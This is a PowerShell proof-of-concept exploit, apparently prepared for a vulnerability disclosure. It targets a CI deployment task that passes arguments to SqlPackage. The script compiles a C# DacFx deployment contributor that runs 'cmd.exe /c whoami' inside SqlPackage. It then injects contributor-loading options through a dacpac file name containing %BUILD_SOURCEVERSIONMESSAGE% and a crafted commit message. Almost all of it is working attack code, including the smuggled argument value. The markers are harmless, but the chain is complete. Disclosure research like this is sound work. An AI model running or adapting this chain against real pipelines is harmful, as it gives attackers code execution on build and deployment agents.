# Ceiling probe 6. Make the attacker-authored contributor LOADABLE, then fire it through the
# injection. The previous pass proved the injected /p:AdditionalDeploymentContributors reaches
# SqlPackage and is acted on; the assembly itself failed to load. Build it against the exact
# DacFx assemblies SqlPackage ships, and read SqlPackage's own diagnostics for the real reason.

$ErrorActionPreference = 'Continue'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$work = Join-Path $env:RUNNER_TEMP ("c6-" + [guid]::NewGuid().ToString('N').Substring(0,8))
foreach ($d in @('db','repo','victim','contrib')) { New-Item -ItemType Directory -Force -Path (Join-Path $work $d) | Out-Null }
$repoDir = Join-Path $work 'repo'; $victimDir = Join-Path $work 'victim'; $proj = Join-Path $work 'contrib'
Write-Output ("PSVersion : " + $PSVersionTable.PSVersion)
$sqlPackage = (Get-ChildItem "C:\Program Files\Microsoft SQL Server\*\DAC\bin\SqlPackage.exe" | Select-Object -First 1).FullName
$dacBin = Split-Path -Parent $sqlPackage
Write-Output ("SqlPackage.exe  : " + $sqlPackage + "  v" + (Get-Item $sqlPackage).VersionInfo.FileVersion)
Write-Output "  DacFx assemblies shipped next to it:"
Get-ChildItem $dacBin -Filter 'Microsoft.SqlServer.Dac*.dll' | ForEach-Object { Write-Output ("    " + $_.Name + "  fileversion " + $_.VersionInfo.FileVersion) }
Write-Output ("  Extensions dir exists : " + (Test-Path (Join-Path $dacBin 'Extensions')))
$rc = Join-Path $dacBin 'SqlPackage.runtimeconfig.json'
if (Test-Path $rc) { Write-Output "  runtimeconfig:"; (Get-Content $rc) | ForEach-Object { Write-Output ("    " + $_) } }

$nupkg = Join-Path $here 'taskmodulesqlutility-0.1.7.nupkg'
Copy-Item $nupkg (Join-Path $work 'pkg.zip')
Expand-Archive -Path (Join-Path $work 'pkg.zip') -DestinationPath (Join-Path $work 'pkg') -Force
$modFile = (Get-ChildItem -Recurse -Path (Join-Path $work 'pkg') -Filter 'SqlPackageOnTargetMachines.ps1' | Select-Object -First 1).FullName
Write-Output ("module sha256   : " + (Get-FileHash -Algorithm SHA256 $modFile).Hash.ToLower())
function Get-LiftedText([string]$file, [string[]]$names) {
    $tok = $null; $err = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($file, [ref]$tok, [ref]$err)
    $fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
    $parts = @(); foreach ($name in $names) { $f = $fns | Where-Object { $_.Name -eq $name } | Select-Object -First 1; $parts += $f.Extent.Text }
    return ($parts -join "`r`n")
}
. ([scriptblock]::Create((Get-LiftedText $modFile @('Get-SqlPackageCmdArgs','ExecuteCommand'))))

$markerA = Join-Path $victimDir 'PWNED-inproc.txt'
$markerB = Join-Path $victimDir 'PWNED-childproc.txt'
$cs = @"
using System;
using System.IO;
using System.Diagnostics;
using Microsoft.SqlServer.Dac.Deployment;
using Microsoft.SqlServer.Dac.Extensibility;

namespace MsrcLab
{
    [ExportDeploymentPlanModifier(MarkerContributor.Id, "1.0.0.0")]
    public class MarkerContributor : DeploymentPlanModifier
    {
        public const string Id = "MsrcLab.MarkerContributor";
        static readonly string MarkerA = @"$markerA";
        static readonly string MarkerB = @"$markerB";
        protected override void OnExecute(DeploymentPlanContributorContext context)
        {
            try {
                string who = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                Process p = Process.GetCurrentProcess();
                File.WriteAllText(MarkerA,
                    "IN-PROCESS CODE EXECUTION INSIDE SqlPackage" + Environment.NewLine +
                    "process=" + p.ProcessName + " pid=" + p.Id + Environment.NewLine +
                    "identity=" + who + Environment.NewLine +
                    "image=" + p.MainModule.FileName + Environment.NewLine);
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c whoami > \"" + MarkerB + "\"");
                psi.UseShellExecute = false; psi.CreateNoWindow = true;
                Process.Start(psi).WaitForExit(20000);
            } catch (Exception ex) {
                File.WriteAllText(MarkerA + ".err", ex.ToString());
            }
        }
    }
}
"@
Set-Content -Path (Join-Path $proj 'Marker.cs') -Value $cs -Encoding UTF8
$refs = (Get-ChildItem $dacBin -Filter '*.dll' | ForEach-Object { '    <Reference Include="' + $_.BaseName + '"><HintPath>' + $_.FullName + '</HintPath><Private>false</Private></Reference>' }) -join "`r`n"
Write-Output ("  referencing " + (Get-ChildItem $dacBin -Filter '*.dll').Count + " assemblies from the DAC bin directory")
$csproj = @"
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <AssemblyName>MsrcLab.Contrib</AssemblyName>
    <Nullable>disable</Nullable>
    <NoWarn>CA1416;CS1701;CS1702;MSB3277</NoWarn>
  </PropertyGroup>
  <ItemGroup>
$refs
  </ItemGroup>
</Project>
"@
Set-Content -Path (Join-Path $proj 'contrib.csproj') -Value $csproj -Encoding UTF8
Push-Location $proj
$b = & dotnet build -c Release -o (Join-Path $proj 'out') 2>&1 | Out-String
Pop-Location
($b -split "`r?`n") | Where-Object { $_ -match 'error|Error|Warning\(s\)|Elapsed' } | Select-Object -First 8 | ForEach-Object { Write-Output ("  build> " + $_.Trim()) }
$dll = Join-Path $proj 'out\MsrcLab.Contrib.dll'
Write-Output ("  contributor dll : " + $dll + "  exists " + (Test-Path $dll))
if (-not (Test-Path $dll)) { Write-Output "cannot continue"; exit 0 }
Copy-Item $dll $repoDir -Force
Write-Output ("  staged in the checked-out tree : " + (Get-ChildItem $repoDir).Name)

& SqlLocalDB.exe create MSRCLAB6 2>&1 | Out-Null
& SqlLocalDB.exe start  MSRCLAB6 2>&1 | Out-Null
$target = '(localdb)\MSRCLAB6'
Set-Content -Path (Join-Path $work 'seed.sql') -Encoding ASCII -Value @"
CREATE DATABASE SrcDb;
GO
USE SrcDb;
GO
CREATE TABLE dbo.[ZZMARKER_ATTACKER_AUTHORED_OBJECT] (id INT NOT NULL);
GO
"@
& sqlcmd -S $target -i (Join-Path $work 'seed.sql') 2>&1 | Select-Object -First 2 | ForEach-Object { Write-Output ("  seed> " + $_) }
$srcDac = Join-Path $work 'db\Fab.dacpac'
& $sqlPackage '/Action:Extract' "/SourceServerName:$target" '/SourceDatabaseName:SrcDb' "/TargetFile:$srcDac" 2>&1 | Select-Object -Last 1 | ForEach-Object { Write-Output ("  extract> " + $_) }
Copy-Item $srcDac (Join-Path $work 'db\Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac') -Force

function Reset-Markers { Remove-Item $markerA, ($markerA + '.err'), $markerB -Force -ErrorAction SilentlyContinue }
function Show-Markers([string]$tag) {
    Write-Output ("  [$tag] IN-PROCESS MARKER    : " + (Test-Path $markerA))
    if (Test-Path $markerA) { (Get-Content $markerA) | ForEach-Object { Write-Output ("      > " + $_) } }
    if (Test-Path ($markerA + '.err')) { (Get-Content ($markerA + '.err')) | Select-Object -First 5 | ForEach-Object { Write-Output ("      ! " + $_) } }
    Write-Output ("  [$tag] CHILD PROCESS MARKER : " + (Test-Path $markerB))
    if (Test-Path $markerB) { (Get-Content $markerB) | ForEach-Object { Write-Output ("      > " + $_.Trim()) } }
}
function Show-Diag([string]$f) {
    if (Test-Path $f) {
        $d = Get-Content $f
        Write-Output ("  diagnostics, " + $d.Count + " lines, extension-load relevant:")
        $d | Where-Object { $_ -match 'xtension|ontributor|Load|Exception|Error|Composition|Assembly' } | Select-Object -First 25 | ForEach-Object { Write-Output ("    diag> " + $_.Trim()) }
    } else { Write-Output "  no diagnostics file" }
}

# ---- C0 capability, directory form, with diagnostics on
Write-Output ""
Write-Output "################ C0 CAPABILITY, direct argv + /Diagnostics:True"
foreach ($cand in @($repoDir, $dll)) {
    Reset-Markers
    $diag = Join-Path $work ("diag-" + [guid]::NewGuid().ToString('N').Substring(0,6) + ".txt")
    Write-Output ("  --- path form : " + $cand)
    $o = & $sqlPackage '/Action:Publish' "/SourceFile:$srcDac" "/TargetServerName:$target" '/TargetDatabaseName:Fab0' "/p:AdditionalDeploymentContributorPaths=$cand" "/p:AdditionalDeploymentContributors=MsrcLab.MarkerContributor" '/Diagnostics:True' "/DiagnosticsFile:$diag" 2>&1 | Out-String
    ($o -split "`r?`n") | Where-Object { $_.Trim() -and $_ -notmatch '^\s*\+' } | Select-Object -First 6 | ForEach-Object { Write-Output ("    out> " + $_.Trim()) }
    Show-Markers 'C0'
    Show-Diag $diag
    if (Test-Path $markerA) { $good = $cand; break }
}

# ---- C0b sanity: does the shipped Extensions directory work at all
if (-not $good) {
    Write-Output ""
    Write-Output "################ C0b sanity, drop the assembly into the shipped Extensions directory"
    $extDir = Join-Path $dacBin 'Extensions'
    New-Item -ItemType Directory -Force -Path $extDir | Out-Null
    Copy-Item $dll $extDir -Force
    Reset-Markers
    $diag2 = Join-Path $work 'diag-ext.txt'
    $o = & $sqlPackage '/Action:Publish' "/SourceFile:$srcDac" "/TargetServerName:$target" '/TargetDatabaseName:Fab0b' "/p:AdditionalDeploymentContributors=MsrcLab.MarkerContributor" '/Diagnostics:True' "/DiagnosticsFile:$diag2" 2>&1 | Out-String
    ($o -split "`r?`n") | Where-Object { $_.Trim() -and $_ -notmatch '^\s*\+' } | Select-Object -First 6 | ForEach-Object { Write-Output ("    out> " + $_.Trim()) }
    Show-Markers 'C0b'
    Show-Diag $diag2
    Remove-Item (Join-Path $extDir 'MsrcLab.Contrib.dll') -Force -ErrorAction SilentlyContinue
}
if (-not $good) { $good = $repoDir }

# ---- C1 through the injection
function RunLeg([string]$label, [string]$fileName, [string]$commitMsg) {
    Write-Host ""
    Write-Host "================ $label"
    Write-Host ("  committed file name : " + $fileName)
    Write-Host ("  commit message      : " + $commitMsg)
    $env:BUILD_SOURCEVERSIONMESSAGE = $commitMsg
    $dacpac = Join-Path $work ("db\" + $fileName)
    $a = Get-SqlPackageCmdArgs -dacpacFile $dacpac -targetMethod 'server' -serverName $target -databaseName 'Fabrikam' -additionalArguments ''
    Write-Host ("  argument string     : " + $a)
    try { $out = ExecuteCommand -FileName $sqlPackage -Arguments $a } catch { $out = "$_" }
    ($out -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 8 | ForEach-Object { Write-Host ("  out> " + $_.Trim()) }
}
Write-Output ""
Write-Output "################ C1 INJECT the contributor options through the committed file name"
Reset-Markers
$junk = Join-Path $work 'junk'
$msgC = '.dacpac" /p:AdditionalDeploymentContributorPaths="' + $good + '" /p:AdditionalDeploymentContributors="MsrcLab.MarkerContributor" /DiagnosticsFile:"' + $junk
RunLeg 'C1 INJECT' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' $msgC
Show-Markers 'C1'

Write-Output ""
Write-Output "################ C2 CONTROL, identical commit message, percent signs removed"
Reset-Markers
RunLeg 'C2 CONTROL percent signs removed' 'Fab.dacpac' $msgC
Show-Markers 'C2'

Write-Output ""
Write-Output "DONE"
exit 0
